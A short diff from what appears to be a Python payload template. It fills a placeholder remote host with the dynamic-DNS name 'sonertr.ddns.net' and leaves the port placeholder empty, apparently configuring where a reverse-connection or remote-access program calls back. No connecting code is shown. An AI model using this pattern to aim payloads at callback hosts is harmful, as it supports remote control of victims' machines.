@@ -14,7 +14,7 @@ import struct
 import json
 
 # --- DYNAMIC CONFIG ---
-RHOST = "##RHOST##"
+RHOST = "sonertr.ddns.net"
 RPORT = ##RPORT##
 # --------------------
 
